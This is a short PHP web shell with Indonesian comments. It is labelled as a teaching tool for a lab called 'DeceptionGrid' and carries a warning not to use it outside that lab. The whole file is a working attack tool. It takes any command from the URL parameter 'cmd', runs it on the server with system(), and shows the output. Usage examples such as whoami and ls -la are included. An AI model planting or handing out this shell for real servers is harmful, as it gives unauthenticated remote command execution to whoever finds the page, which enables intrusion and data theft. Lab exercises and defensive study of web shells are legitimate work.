<?php
// Simple PHP Web Shell untuk Edukasi Lab
// Jangan gunakan di luar environment DeceptionGrid

echo "<h2>DeceptionGrid Testing Shell</h2>";
echo "<p>Status: <b>Active</b></p>";
echo "<hr>";

// Mengecek apakah parameter 'cmd' dikirim melalui URL (GET request)
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<b>Executing:</b> <code>" . htmlspecialchars($cmd) . "</code><br><br>";
    
    // Mengeksekusi perintah sistem dan menampilkannya di dalam tag <pre> agar rapi
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "<p>Gunakan parameter <code>?cmd=</code> di URL untuk menjalankan perintah.</p>";
    echo "<p>Contoh: <code>shell.php?cmd=whoami</code> atau <code>shell.php?cmd=ls -la</code></p>";
}
?>